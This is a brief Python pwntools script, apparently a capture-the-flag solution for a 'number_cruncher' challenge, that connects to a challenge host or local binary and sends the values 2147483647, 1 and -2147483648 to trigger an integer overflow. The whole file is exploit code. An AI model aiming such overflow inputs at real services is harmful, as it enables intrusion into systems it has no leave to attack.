from pwn import *

if args.REMOTE:
    host = "challs.umasscybersec.org"
    port = 7878
    p = remote(host, port)
else:
    p = process('./number_cruncher')

p.sendline('2147483647')
p.sendline('1')
p.sendline('-2147483648')
p.interactive()
